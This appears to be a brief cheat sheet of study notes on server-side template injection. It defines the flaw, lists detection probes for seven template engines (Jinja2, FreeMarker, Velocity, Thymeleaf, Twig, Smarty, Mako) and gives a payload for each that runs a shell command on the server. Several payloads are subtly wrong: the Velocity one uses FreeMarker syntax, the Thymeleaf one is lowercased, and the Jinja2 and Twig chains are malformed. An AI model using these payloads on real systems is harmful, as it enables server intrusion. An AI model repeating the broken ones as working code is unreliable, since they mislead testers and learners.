# ssti
server-side template injection (ssti) is a web security vulnerability that occurs when user input is unsafely embedded into a server-side template.

## **template engine**: engine software which is used to generate html dynamically. it replaces placeholders in templates with actual data.

**common template engines and their playloads**

jinja2 (python flask/django): ``{{ 7*7 }}``
freemarker (java):`` ${7*7}``
velocity (java):`` #set($a = 7*7)${a}``
thymeleaf (java): ``${7*7}``
twig (php symfony):`` {{ 7*7 }}``
smarty (php):`` {$7*7}``
mako (python):`` <% print 7*7 %>``



```jinja
{{ ''.__class__.__mro__[1].__subclasses__()[59]('import os; os.popen("ls /").read()', 'exec') }}
```

```freemarker
${"freemarker.template.utility.execute"?new()("ls /")}
```

```velocity
#set($x = "freemarker.template.utility.execute"?new())
$x("ls /")
```

```thymeleaf
${t(java.lang.runtime).getruntime().exec("ls /")}
```

```twig
{{ constant('symfony\\component\\process\\process')('ls /') }}
```

```smarty
{php}system('ls /');{/php}
```

```mako
<% import os; os.system("ls /") %>
```

